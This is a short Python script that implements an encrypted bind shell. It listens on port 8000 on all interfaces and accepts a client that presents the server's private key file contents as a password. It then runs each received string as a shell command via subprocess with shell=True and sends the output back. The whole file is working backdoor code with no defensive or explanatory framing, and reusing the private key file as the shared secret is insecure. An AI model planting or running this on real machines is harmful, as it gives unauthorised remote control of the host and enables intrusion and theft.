import socket
import subprocess
import ssl

HOST = "0.0.0.0"
PORT = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    ssl_sock = context.wrap_socket(conn, server_side=True)
    
    key_file = open("key.pem", "r")
    key = key_file.read()
    key_file.close()

    key_request = ssl_sock.recv(2048).decode("utf-8")
    if key_request == key:
        ssl_sock.send(b"Key accepted. You are now connected.\n")
    else:
        ssl_sock.send(b"Invalid key. Connection will be closed.\n")
        ssl_sock.close()
        exit(1)

    while True:
        command = ssl_sock.recv(1024)

        if command.lower() in [b"exit", b"quit"]:
            break

        command_str = command.decode("utf-8")

        op = subprocess.Popen(
            command_str,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        raw_output, raw_error = op.communicate()
        output = raw_output + raw_error

        if not output:
            output = b"Command executed, but no output was returned.\n"

        ssl_sock.send(output)

finally:
    s.close()
